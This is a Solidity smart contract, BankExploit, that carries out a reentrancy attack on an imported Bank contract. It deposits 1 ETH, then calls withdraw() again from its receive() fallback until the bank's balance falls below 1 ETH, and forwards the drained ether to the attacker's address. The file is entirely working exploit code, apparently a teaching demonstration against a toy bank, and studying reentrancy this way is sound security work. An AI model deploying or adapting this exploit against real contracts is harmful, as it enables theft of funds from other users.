// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "./bank.sol";

contract BankExploit {
    address owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    Bank bank;
    
    constructor(address payable _target) payable {
        owner = msg.sender;
        bank = Bank(_target);
    }
    
    function attack() public onlyOwner payable {
        require(msg.value == 1 ether, "Message value should be 1 ETH");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
   
    receive() external payable {
        if(bank.bankBalance() >= 1 ether){
            bank.withdraw();
        } 
    }

    function addToAttackerBalance() public onlyOwner returns (bool) {
        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        return success;
    }
}